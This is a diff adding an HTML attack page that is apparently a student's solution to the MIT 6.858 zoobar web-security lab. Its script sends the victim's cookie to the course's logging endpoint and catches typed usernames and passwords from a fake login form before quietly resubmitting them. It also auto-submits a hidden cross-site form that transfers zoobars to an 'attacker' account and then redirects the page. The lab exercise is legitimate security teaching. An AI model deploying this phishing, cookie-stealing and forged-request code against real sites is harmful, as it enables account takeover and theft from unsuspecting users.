@@ -1,0 +1,58 @@
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.
+cgi/login">
+  <table>
+    <tr>
+      <td>Username:</td>
+      <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
+    </tr>
+    <tr>
+      <td>Password:</td>
+      <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+      <input type="submit" name="submit_login" value="Log in">
+      <input type="submit" name="submit_registration" value="Register"></td>
+    </tr>
+  </table>
+  <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="_blank">
+  <p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</>
+  <p>to <input name=recipient type="text" value="attacker" size=10></p>
+  <input type="submit" name="submission" value="Send">
+</form>
+
+<iframe id="_blank" name="_blank" src="https://css.csail.mit.edu/6.858/2020/" style="display:none"></iframe>
+
+<script type="text/javascript">
+  (new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=edithwuly' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();
+  if (document.cookie == null) {
+    var click;
+
+    loginform.submit_login.onclick = function(){
+      click = 'submit_login';
+    }
+    loginform.submit_registration.onclick = function(){
+      click = 'submit_registration';
+    }
+
+    document.forms[0].onsubmit = function(e) {
+      (new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=edithwuly' + '&payload=' + loginform.login_username.value + '/' + loginform.login_password.value + '&random=' + Math.random();
+      e.preventDefault();
+      setTimeout(function() {
+        document.forms[0].onsubmit = null;
+        if (click == 'submit_login') {
+	  loginform.submit_login.click();
+        }
+        else {
+	  loginform.submit_registration.click();
+        }
+      }, 5000);
+    }
+  }
+  else {
+    transferform.submit();
+    document.getElementById('_blank').addEventListener("load", function() {
+      window.location.href='https://css.csail.mit.edu/6.858/2020/';
+    });
+  }
+</script>
